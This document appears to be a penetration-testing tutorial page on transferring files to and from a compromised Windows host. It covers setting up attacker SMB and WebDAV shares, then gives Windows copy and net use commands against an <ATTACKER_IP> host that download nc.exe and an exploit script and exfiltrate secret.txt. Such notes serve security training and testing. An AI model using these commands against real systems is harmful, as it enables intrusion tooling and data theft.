---
title: SMB File Transfer
description: Learn how to transfer files from and to a compromised target using SMB.
categories: [File Transfer]
tags: [File Transfer, SMB]
weight: 2
---

SMB is ubiquitous in Windows-based internal network environments like an Active Directory network. As such, it also provides opportunities for attackers to transfer files into the network or exfiltrate them from it.

In this article, we will primarily discuss file download and upload methods for Windows targets. SMB file transfer on Linux targets can be achieved with `smbclient` if it is installed on the target machine.

## SMB Server Setup
If we want to host an SMB server on the Linux attacker machine, we can use Impacket's `smbserver.py`. Note that elevated privileges are needed to bind to port numbers less than 1024.
```bash
sudo smbserver.py share -smb2support /tmp/smbshare
```

## SMB File Transfer

### SMB File Download
From the Windows host, we can issue `copy` commands to download files from our SMB share.
```shell-session
C:\> copy \\<ATTACKER_IP>\share\nc.exe

        1 file(s) copied.
```

Many modern Windows versions and editions block insecure guest SMB access by default. We can use authenticated access by setting a username and password with our SMB server; SMB signing requirements and other client policies must also be satisfied:
```bash
sudo smbserver.py share -smb2support /tmp/smbshare -user <USERNAME> -password <PASSWORD>
```

We can establish an authenticated connection and map our share with `net use` before transferring files.
```shell-session
C:\> net use n: \\<ATTACKER_IP>\share /user:<USERNAME> <PASSWORD>

The command completed successfully.

C:\> copy n:\nc.exe
        1 file(s) copied.
```

### SMB File Upload
Similarly, file upload from the target to the attacker machine can be done using the `copy` command.
```shell-session
C:\> net use n: \\<ATTACKER_IP>\share /user:<USERNAME> <PASSWORD>

The command completed successfully.
C:\> copy secret.txt n:\
        1 file(s) copied.

C:\> dir n:\
 Volume in drive N has no label.
 Volume Serial Number is ABCD-EFAA

 Directory of n:\

01/28/2026  02:21 PM                11 secret.txt
               1 File(s)             11 bytes
               0 Dir(s)  15,207,469,056 bytes free
```

## WebDAV File Transfer
Many organizations may flag SMB traffic out of their internal network as suspicious or block it altogether. WebDAV is an extension of HTTP for accessing and managing remote files. Windows can expose a WebDAV share through a UNC path or mapped drive, but the transfer uses HTTP(s), not SMB tunneled over HTTP. It may work where outbound SMB is blocked, but HTTP(s) egress controls and proxy policies can still block it.

To set up a WebDAV server on our Linux attacker machine, we need two Python modules: `wsgidav` and `cheroot`. Below is the `wsgidav` command to set up a WebDAV share with anonymous read-write access:
```bash
sudo wsgidav --host=0.0.0.0 --port=80 --root=<SHARE_PATH> --auth=anonymous
```

On our Windows host, the WebDAV redirector must be installed and the WebClient service running. We can connect to the WebDAV share by specifying `DavWWWRoot`, a special UNC path component that refers to the server root rather than a physical directory.
```shell-session
C:\> dir \\<ATTACKER_IP>\DavWWWRoot
 Volume in drive \\<ATTACKER_IP>\DavWWWRoot has no label.
 Volume Serial Number is 0000-0000

 Directory of \\<ATTACKER_IP>\DavWWWRoot

01/28/2026  02:46 PM    <DIR>          .
01/28/2026  02:46 PM    <DIR>          ..
01/28/2026  02:46 PM    <DIR>          exploits
01/28/2026  02:21 PM                11 secret.txt
               1 File(s)             11 bytes
               3 Dir(s)  12,622,446,592 bytes free
```
To access a nested directory on the share, simply specify the name of the directory (e.g. `exploits`) in lieu of `DavWWWRoot`.
```shell-session
C:\> dir \\<ATTACKER_IP>\exploits
 Volume in drive \\<ATTACKER_IP>\exploits has no label.
 Volume Serial Number is 0000-0000

 Directory of \\<ATTACKER_IP>\exploits

01/28/2026  02:46 PM    <DIR>          .
01/28/2026  02:46 PM    <DIR>          ..
01/28/2026  02:45 PM                10 exploit.ps1
               1 File(s)             10 bytes
               2 Dir(s)  12,623,360,000 bytes free

C:\> copy \\<ATTACKER_IP>\exploits\exploit.ps1
        1 file(s) copied.

C:\> type exploit.ps1
PWN3D!!!!
```
Alternatively, WebDAV can also be mapped with a drive letter using `net use`.
```shell-session
PS C:\Users\Brian> net use W: \\<ATTACKER_IP>\DavWWWRoot /user:anonymous password
The command completed successfully.

PS C:\> dir W:\


    Directory: W:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/28/2026   2:46 PM                exploits
-a----         1/28/2026   2:21 PM             11 secret.txt
```

## Delete Drive Mapping
If you used `net use` to map your SMB or WebDAV share to a drive letter, unmap it before shutting the server down.
```cmd
net use <DRIVE_LETTER> /delete
```
